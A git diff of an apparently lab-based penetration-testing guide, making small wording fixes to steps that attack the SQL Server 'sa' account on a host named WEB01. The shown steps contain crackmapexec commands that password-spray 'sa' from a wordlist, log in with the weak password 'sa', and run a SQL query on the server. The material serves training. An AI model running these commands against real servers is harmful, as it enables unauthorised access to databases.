@@ -33,7 +33,7 @@ One of the default users (not enabled by default) for SQL Server is the SA user.
 
 ### Executing the attack
 
-1. Check if the MSSQL server on WEB01 can be contacted from our Kali machine:
+1. Check if the MSSQL server on `WEB01` can be contacted from our Kali machine:
 
 ```
 crackmapexec mssql 10.0.0.5 -d .
@@ -56,7 +56,7 @@ sa
 
 ![](<../../.gitbook/assets/image (41) (1).png>)
 
-3\. Run crackmapexec to connect to the MSSQL service and passwordspray the passwords till there is a successfull login:
+3\. Run Crackmapexec to connect to the MSSQL service running on `WEB01` and passwordspray the passwords till there is a succesfull login:
 
 ```
 crackmapexec mssql 10.0.0.5 -u sa -p passwords.txt --local-auth
@@ -66,7 +66,7 @@ crackmapexec mssql 10.0.0.5 -u sa -p passwords.txt --local-auth
 
 We got a succesfull login as the `sa` user with the password `sa`.
 
-4\. Run crackmapexec again with the password sa and use the `-q` flag to try to execute the query `select @@version` to retrieve the MSSQL version.
+4\. Run Crackmapexec again with the password sa and use the `-q` flag to try to execute the query `select @@version` to retrieve the MSSQL version.
 
 ```
 crackmapexec mssql 10.0.0.5 -u sa -p sa --local-auth -q "select @@version;"
